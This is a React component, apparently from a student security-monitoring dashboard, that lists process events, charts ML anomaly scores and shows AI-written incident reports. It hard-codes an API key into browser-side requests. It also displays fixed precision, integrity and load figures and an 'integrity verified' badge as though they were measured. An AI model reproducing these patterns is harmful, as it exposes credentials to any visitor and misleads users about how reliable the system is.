    const interval = setInterval(fetchEvents, 10000);
    return () => clearInterval(interval);
  }, []);

  const fetchEvents = async () => {
    try {
      const res = await fetch('/api/events?limit=30', {
        headers: { 'X-API-Key': 'soc_diploma_secret_2026' }
      });
      const data = await res.json();
      setEvents([...data].reverse());
    } catch (err) {
      console.error("Fetch Error:", err);
    }
  };

  const startSimulation = () => {
    setIsSimulating(true);
    fetch('/api/simulate', { 
      method: 'POST',
      headers: { 'X-API-Key': 'soc_diploma_secret_2026' }
    }).catch(err => console.error("Simulation Error:", err));
    setTimeout(() => setIsSimulating(false), 2000);
  };

  const chartData = useMemo(() => {
    return [...events].reverse().slice(-20).map(e => ({
      name: `#${e.id}`,
      score: parseFloat(e.anomaly_score.toFixed(3)),
    }));
  }, [events]);

  const openReport = async (event: SOCEvent) => {
    setSelectedEvent(event);
    setIsModalOpen(true);
    setAiReport("🤖 Sentinel AI analyzing attack vector...");
    try {
      const res = await fetch(`/api/events/${event.id}/report`, {
        headers: { 'X-API-Key': 'soc_diploma_secret_2026' }
      });
      const data = await res.json();
      setAiReport(data.report);
    } catch (err) {
      setAiReport("❌ System failure: AI module unreachable.");
    }
  };

  const criticalCount = events.filter(e => e.severity === 'critical' || e.severity === 'high').length;

  // Strip raw Markdown symbols from AI report text
  const cleanReport = (text: string): string => {
    return text
      .replace(/^#{1,6}\s*/gm, '')              // ### headers
      .replace(/\*\*(.+?)\*\*/g, '$1')          // **bold**
      .replace(/\*([^*\n]+?)\*/g, '$1')         // *italic*
      .replace(/`([^`]+)`/g, '$1')              // `code`
      .replace(/^---+$/gm, '──────────────')    // --- dividers
      .replace(/^\s*[-]\s+/gm, '• ')           // - list items
      .trim();
  };

  if (!isMounted) return null;

  return (
    <div className="min-h-screen relative overflow-hidden selection:bg-blue-500/30 font-sans">
      {/* Background Layer */}
      <div className="fixed inset-0 bg-[#020617] -z-20" />
      <div className="fixed inset-0 bg-grid opacity-20 -z-10" />
      
      {/* Static Glows — CSS-only, GPU-composited, no JS overhead */}
      <div className="glow-orb-1" />
      <div className="glow-orb-2" />

      <div className="max-w-[1600px] mx-auto p-4 md:p-8 lg:p-12 space-y-12 relative z-10">
        
        {/* Navigation / Header */}
        <header className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-6">
          <div className="flex items-center gap-6">
            <motion.div 
              initial={{ rotate: -10, scale: 0.9 }}
              animate={{ rotate: 0, scale: 1 }}
              className="relative"
            >
              <div className="p-4 bg-gradient-to-br from-blue-600 to-indigo-700 rounded-2xl shadow-2xl shadow-blue-500/20">
                <ShieldAlert className="w-10 h-10 text-white" />
              </div>
              <div className="absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full border-4 border-[#020617] animate-pulse" />
            </motion.div>
            <div>
              <h1 className="text-4xl font-black tracking-tighter text-white flex items-center gap-3">
                SENTINEL<span className="text-blue-500">CORE</span>
                <span className="text-[10px] font-mono px-2 py-0.5 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-md tracking-widest align-middle mt-1 uppercase">Advanced ML</span>
              </h1>
              <p className="text-slate-500 text-xs font-mono tracking-[0.3em] uppercase flex items-center gap-2 mt-1">
                <Activity size={12} className="text-emerald-500" /> System Live // Real-Time Process Monitor
              </p>
            </div>
          </div>

          <div className="flex items-center gap-4 w-full lg:w-auto">
            <div className="hidden sm:flex glass px-6 py-3 rounded-2xl items-center gap-8 border-white/5">
              <div className="flex flex-col">
                <span className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Network Status</span>
                <span className="text-xs text-emerald-400 font-mono flex items-center gap-1.5">
                  <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" /> OPTIMAL
                </span>
              </div>
              <div className="w-px h-8 bg-white/5" />
              <div className="flex flex-col">
                <span className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Engine Load</span>
                <span className="text-xs text-blue-400 font-mono">1.24%</span>
              </div>
            </div>
            
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={startSimulation}
              disabled={isSimulating}
              className={`flex-1 sm:flex-none glass px-8 py-4 rounded-2xl text-[11px] font-black uppercase tracking-widest border transition-all ${
                isSimulating 
                ? 'opacity-50 cursor-not-allowed border-white/5' 
                : 'border-blue-500/30 hover:bg-blue-600 hover:border-blue-500 text-blue-400 hover:text-white shadow-xl shadow-blue-900/10'
              }`}
            >
              {isSimulating ? (
                <span className="flex items-center gap-2">
                  <RefreshCw className="animate-spin" size={14} /> Running Simulation...
                </span>
              ) : 'Run Demo Simulation'}
            </motion.button>
          </div>
        </header>

        {/* Top Analytics */}
        <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-6">
          <StatCard title="Events Monitored" value={events.length} icon={Search} color="blue" delay={0.1} />
          <StatCard title="Threats Detected" value={criticalCount} icon={AlertTriangle} color="red" alert={criticalCount > 0} delay={0.2} />
          <StatCard title="System Integrity" value="99.9%" icon={ShieldCheck} color="emerald" delay={0.3} />
          <StatCard title="AI Precision" value="94.2%" icon={Cpu} color="purple" delay={0.4} />
        </div>

        {/* Live Device Scanner — one click, real device data, real ML */}
        <LiveDeviceScanner onScanComplete={fetchEvents} />

        {/* Threat Scanner */}
        <ThreatScanner />

        {/* Real Device Agent */}
        <AgentConnectCard />

        {/* Visualization & Info */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <motion.div 
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="lg:col-span-2 glass rounded-[2.5rem] p-8 relative group"
          >
            <div className="flex items-center justify-between mb-8">
              <div>
                <h3 className="text-lg font-bold text-white flex items-center gap-3">
                  <TrendingUp className="text-blue-500" size={20} />
                  Anomaly Trend Analysis
                </h3>
                <p className="text-slate-500 text-xs mt-1">Real-time heuristic scoring over last 20 events</p>
              </div>
              <div className="flex gap-2">
                {['1H', '4H', '24H'].map(t => (
                  <button key={t} className={`px-3 py-1 rounded-lg text-[10px] font-bold ${t === '1H' ? 'bg-blue-500 text-white' : 'bg-white/5 text-slate-500'}`}>{t}</button>
                ))}
              </div>
            </div>
            
            <div className="min-h-[300px] h-[300px] w-full">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={chartData}>
                  <defs>
                    <linearGradient id="colorScore" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.3}/>
                      <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" vertical={false} />
                  <XAxis dataKey="name" stroke="#475569" fontSize={10} tickLine={false} axisLine={false} tick={{fill: '#64748b'}} />
                  <YAxis stroke="#475569" fontSize={10} tickLine={false} axisLine={false} domain={['auto', 'auto']} tick={{fill: '#64748b'}} />
                  <Tooltip
                    contentStyle={{ backgroundColor: '#0f172a', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '16px', boxShadow: '0 10px 30px rgba(0,0,0,0.5)' }}
                    itemStyle={{ color: '#3b82f6', fontSize: '12px', fontWeight: 'bold' }}
                    labelStyle={{ color: '#94a3b8', fontSize: '10px', marginBottom: '4px' }}
                  />
                  <Area 
                    type="monotone" 
                    dataKey="score" 
                    stroke="#3b82f6" 
                    strokeWidth={4} 
                    fillOpacity={1} 
                    fill="url(#colorScore)" 
                    isAnimationActive={false}
                  />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            className="glass rounded-[2.5rem] p-8 flex flex-col justify-center items-center text-center relative overflow-hidden bg-gradient-to-br from-indigo-500/10 to-transparent"
          >
            <div className="relative mb-8">
              <div className="w-32 h-32 rounded-full border-2 border-dashed border-blue-500/30 p-2 spin-slow">
                <div className="w-full h-full rounded-full border-2 border-blue-500/50 flex items-center justify-center">
                  <div className="w-16 h-16 rounded-full bg-blue-500/20 flex items-center justify-center">
                    <Zap className="text-blue-400" size={32} />
                  </div>
                </div>
              </div>
              <div className="absolute inset-0 bg-blue-500/20 rounded-full animate-pulse-slow -z-10" />
            </div>
            
            <h4 className="text-xl font-black text-white italic uppercase tracking-tighter mb-4">Neural Engine Active</h4>
            <p className="text-slate-400 text-sm leading-relaxed px-4">
              Isolation Forest ML model analyses real processes from this device. Click <span className="text-emerald-400 font-bold">Start Live Agent</span> to scan now.
            </p>
            
            <div className="mt-8 flex flex-wrap justify-center gap-3">
              {[
                { icon: Server, label: 'Cluster 01' },
                { icon: Globe, label: 'Edge Nodes' },
                { icon: Lock, label: 'Secure Vault' }
              ].map((item, i) => (
                <div key={i} className="flex items-center gap-2 px-4 py-2 bg-black/40 border border-white/5 rounded-xl text-[10px] text-slate-300 font-bold uppercase tracking-widest">
                  <item.icon size={12} className="text-blue-500" />
                  {item.label}
                </div>
              ))}
            </div>
          </motion.div>
        </div>

        {/* Event Table */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass rounded-[2.5rem] overflow-hidden shadow-2xl relative border-white/5"
        >
          <div className="p-8 border-b border-white/5 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 bg-white/[0.02]">
            <div className="flex items-center gap-4">
              <div className="p-3 bg-blue-500/10 rounded-2xl border border-blue-500/20">
                <Terminal size={20} className="text-blue-400" />
              </div>
              <div>
                <h2 className="text-xl font-black text-white uppercase tracking-tighter">Event Forensics</h2>
                <p className="text-[10px] text-slate-500 font-mono tracking-widest mt-1">LIVE DEVICE PROCESS FEED</p>
              </div>
            </div>
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-3">
                <span className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Live Monitoring</span>
              </div>
              <div className="w-px h-8 bg-white/5 hidden sm:block" />
              <button className="p-2 hover:bg-white/5 rounded-xl transition-colors text-slate-500 hover:text-white">
                <Search size={20} />
              </button>
            </div>
          </div>

          <div className="overflow-x-auto max-h-[600px] custom-scrollbar">
            <table className="w-full text-left border-collapse">
              <thead className="sticky top-0 bg-[#020617] z-10 border-b border-white/5">
                <tr className="text-slate-500 text-[10px] uppercase font-black tracking-[0.2em]">
                  <th className="px-8 py-5">Process Origin</th>
                  <th className="px-8 py-5">Command Context</th>
                  <th className="px-8 py-5">MITRE Matrix</th>
                  <th className="px-8 py-5 text-center">Threat Level</th>
                  <th className="px-8 py-5 text-right">ML Score</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/[0.03]">
                  {events.map((event) => (
                    <tr
                      key={event.id}
                      onClick={() => openReport(event)}
                      className="group hover:bg-blue-500/[0.04] transition-colors cursor-pointer border-l-4 border-l-transparent hover:border-l-blue-500"
                    >
                      <td className="px-8 py-6">
                        <div className="flex items-center gap-4">
                          <div className="w-10 h-10 bg-slate-900 rounded-xl flex items-center justify-center group-hover:bg-blue-900/40 group-hover:scale-110 transition-all border border-white/5">
                            <Database size={16} className={event.severity === 'normal' ? 'text-slate-500' : 'text-red-400'} />
                          </div>
                          <div>
                            <div className="font-bold text-slate-100 text-sm group-hover:text-blue-400 transition-colors">{event.process_name}</div>
                            <div className="text-[10px] text-slate-500 font-mono tracking-tighter uppercase mt-0.5">{event.user}</div>
                          </div>
                        </div>
                      </td>
                      <td className="px-8 py-6">
                        <div className="max-w-[280px] xl:max-w-md truncate font-mono text-[10px] text-slate-400 bg-black/40 px-3 py-2 rounded-xl border border-white/5 group-hover:border-blue-500/30 transition-colors">
                          {event.command_line}
                        </div>
                      </td>
                      <td className="px-8 py-6">
                        {event.mitre_technique ? (
                          <span className="text-[10px] text-indigo-400 bg-indigo-500/10 px-3 py-1.5 rounded-lg border border-indigo-500/20 font-black uppercase tracking-tighter">
                            {event.mitre_technique}
                          </span>
                        ) : (
                          <span className="text-[10px] text-slate-600 italic">No Match Detected</span>
                        )}
                      </td>
                      <td className="px-8 py-6 text-center">
                        <StatusBadge severity={event.severity} />
                      </td>
                      <td className="px-8 py-6 text-right font-mono text-xs text-slate-400 group-hover:text-blue-400 group-hover:font-bold">
                        {event.anomaly_score.toFixed(4)}
                      </td>
                    </tr>
                  ))}
              </tbody>
            </table>
          </div>
          <div className="p-4 bg-white/[0.01] border-t border-white/5 text-center">
            <span className="text-[10px] text-slate-600 font-mono uppercase tracking-widest">End of visible telemetry buffer</span>
          </div>
        </motion.div>
      </div>

      {/* AI Modal */}
      <AnimatePresence>
        {isModalOpen && selectedEvent && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsModalOpen(false)}
              className="absolute inset-0 bg-black/85"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="glass w-full max-w-3xl rounded-[3rem] shadow-[0_0_100px_rgba(59,130,246,0.2)] overflow-hidden relative border-white/10 flex flex-col max-h-[90vh]"
            >
              <div className="p-10 border-b border-white/5 flex justify-between items-center bg-gradient-to-br from-blue-600/20 via-transparent to-transparent">
                <div className="flex items-center gap-6">
                  <div className="p-4 bg-blue-500/20 rounded-2xl border border-blue-500/30">
                    <Cpu className="w-8 h-8 text-blue-400" />
                  </div>
                  <div>
                    <h3 className="text-3xl font-black text-white italic uppercase tracking-tighter">Core Intelligence Report</h3>
                    <p className="text-[10px] text-blue-400/60 font-mono tracking-[0.4em] mt-1 uppercase">Event Forensic Analysis #{selectedEvent.id}</p>
                  </div>
                </div>
                <button 
                  onClick={() => setIsModalOpen(false)} 
                  className="p-3 hover:bg-white/10 rounded-full transition-all text-slate-500 hover:text-white"
                >
                  <X size={24} />
                </button>
              </div>

              <div className="p-6 md:p-10 space-y-6 overflow-y-auto flex-1 custom-scrollbar">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                  <div className="glass bg-black/40 p-6 rounded-[2rem] border-white/5">
                    <p className="text-slate-500 text-[10px] uppercase font-black tracking-widest mb-2">Process Origin</p>
                    <p className="font-bold text-white text-xl">{selectedEvent.process_name}</p>
                  </div>
                  <div className="glass bg-black/40 p-6 rounded-[2rem] border-white/5">
                    <p className="text-slate-500 text-[10px] uppercase font-black tracking-widest mb-2">ML Confidence</p>
                    <p className={`font-mono text-2xl font-black ${selectedEvent.anomaly_score < 0 ? 'text-red-500' : 'text-emerald-500'}`}>
                      {selectedEvent.anomaly_score.toFixed(5)}
                    </p>
                  </div>
                </div>

                <motion.div 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.3 }}
                  className="bg-blue-600/5 p-8 rounded-[2.5rem] border border-blue-500/20 relative overflow-hidden group"
                >
                  <div className="flex items-start gap-6 relative z-10">
                    <div className="p-3 bg-blue-500/10 rounded-xl mt-1">
                      <Info className={`w-6 h-6 ${aiReport.includes("❌") ? 'text-red-500' : 'text-blue-400'}`} />
                    </div>
                    <div className="space-y-4">
                      <div className="text-slate-200 leading-relaxed font-medium text-base whitespace-pre-wrap">
                        {cleanReport(aiReport)}
                      </div>

                      {!aiReport.includes("analyzing") && !aiReport.includes("❌") && (
                        <motion.div 
                          initial={{ scaleX: 0 }}
                          animate={{ scaleX: 1 }}
                          className="flex items-center gap-3 text-[10px] text-emerald-400 font-black uppercase tracking-[0.2em] pt-4 border-t border-emerald-500/10"
                        >
                          <ShieldCheck size={14} /> Analysis Integrity Verified by Sentinel v2.6.4
                        </motion.div>
                      )}
                    </div>
                  </div>
                  
                  {/* Subtle shimmer for "analyzing" state */}
                  {aiReport.includes("analyzing") && (
                    <motion.div 
                      animate={{ x: ['-100%', '100%'] }}
                      transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                      className="absolute inset-0 bg-gradient-to-r from-transparent via-blue-500/10 to-transparent" 
                    />
                  )}
                </motion.div>

                <div className="pt-4 flex flex-col sm:flex-row justify-between items-center gap-6">
                  <span className="text-[10px] text-slate-600 font-mono uppercase tracking-[0.3em]">Signature: SENTINEL-CORE-ALPHA-99</span>
                  <motion.button
                    whileHover={{ scale: 1.05, backgroundColor: '#3b82f6' }}
                    whileTap={{ scale: 0.95 }}
                    onClick={() => setIsModalOpen(false)}
                    className="w-full sm:w-auto bg-blue-600/80 text-white px-10 py-4 rounded-2xl text-[11px] font-black uppercase tracking-widest transition-all shadow-2xl shadow-blue-600/20"
                  >
                    Acknowledge Intelligence
                  </motion.button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
